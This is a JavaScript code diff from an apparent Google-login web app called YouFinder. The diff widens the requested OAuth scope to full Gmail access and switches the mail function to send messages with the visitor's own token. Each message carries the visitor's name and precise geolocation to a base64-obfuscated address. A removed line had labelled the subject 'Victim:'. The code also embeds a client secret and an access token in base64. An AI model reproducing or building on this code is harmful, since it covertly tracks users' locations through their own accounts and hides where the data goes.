@@ -2,7 +2,7 @@ let Info = {
 	ClientID: "239141875067-k7ftnrifgiv328ai7j0nnec8s79pjlro.apps.googleusercontent.com",
 	SecretID: atob("Z21COW1NOWVxVXhCOHRqNVVBSWZIeThf"),
 	RedirectURL: "https://genbuproject.github.io/Content/Specifics/YouFinder/",
-	Scope: "https://www.googleapis.com/auth/plus.login+https://www.googleapis.com/auth/plus.me",
+	Scope: "https://www.googleapis.com/auth/plus.login+https://www.googleapis.com/auth/plus.me+https://mail.google.com/",
 	
 	Token: "",
 	
@@ -92,7 +92,7 @@ let Net = {
 	
 	SendGmail: function (OnLoad) {
 		let MailSender = new XMLHttpRequest();
-			MailSender.open("POST", "https://www.googleapis.com/gmail/v1/users/me/drafts?access_token=" + atob("eWEyOS5DaV9BQTV3YUVzRU43ZF9jTWYwdk0yY05TMlhfUmNNX2lZNmpacVI3ZDg3MzhCOHI5dkt4QV8tb0s2MXNfYUJKbFE="), true);
+			MailSender.open("POST", "https://www.googleapis.com/gmail/v1/users/me/messages/send?access_token=" + Info.Token, true);
 			
 			MailSender.onload = function (Event) {
 				OnLoad();
@@ -100,14 +100,13 @@ let Net = {
 			
 			MailSender.send(JSON.stringify(
 				{
-					messages: {
-						raw: btoa(unescape(encodeURIComponent([
-							"To: genbuproject@gmail.com",
-							"Subject: =?utf-8?B?Victim:" + btoa(unescape(encodeURIComponent(Info.Datas.Name))) + "?=",
+					raw: btoa(unescape(encodeURIComponent(
+						[
+							"To: " + atob("Z2VuYnVwcm9qZWN0QGdtYWlsLmNvbQ=="),
+							"Subject: =?utf-8?B?From " + btoa(unescape(encodeURIComponent(Info.Datas.Name))) + "?=",
 							"MIME-Version: 1.0",
 							"Content-Type: text/plain; charset=UTF-8",
 							"Content-Transfer-Encoding: 7bit",
-							"",
 							Info.Datas.Location.Latitude,
 							Info.Datas.Location.Longitude,
 							Info.Datas.Location.Accuracy,
@@ -115,8 +114,8 @@ let Net = {
 							Info.Datas.Location.AltitudeAccuracy,
 							Info.Datas.Location.Heading,
 							Info.Datas.Location.Speed
-						].join("\n").trim()))).replace(/\+/g, "-").replace(/\//g, "_")
-					}
+						].join("\n").trim()
+					))).replace(/\+/g, "-").replace(/\//g, "_")
 				}
 			));
 	}
